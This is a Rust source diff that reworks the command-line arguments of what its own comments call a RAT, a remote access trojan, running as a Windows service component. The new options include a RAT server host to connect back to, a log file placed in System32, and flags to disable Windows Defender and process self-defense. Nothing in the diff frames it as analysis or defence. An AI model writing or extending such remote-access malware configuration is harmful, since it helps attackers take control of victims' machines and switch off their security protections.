@@ -7,10 +7,23 @@ use clap::{Parser, crate_description, crate_version};
     version = crate_version!(),
 )]
 pub struct Arguments {
-    /// Arguments for the user-mode Windows service component
-    #[arg(
-        long,
-        default_value = "--host 192.168.56.1:12110 --log-path \"%SystemRoot%\\System32\\violet.log\" --scm"
-    )]
-    pub argument: String,
+    /// Host of the RAT server to connect to
+    #[arg(long, default_value = "192.168.56.1:12110")]
+    pub host: String,
+
+    /// The logging level
+    #[arg(long, default_value = "info")]
+    pub log_level: String,
+
+    /// Path to the log file, relative to System32 directory
+    #[arg(long, default_value = "violet.log")]
+    pub log_path: String,
+
+    /// Disable Windows Defender
+    #[arg(long)]
+    pub disable_wd: bool,
+
+    /// Disable process self-defense
+    #[arg(long)]
+    pub disable_sd: bool,
 }
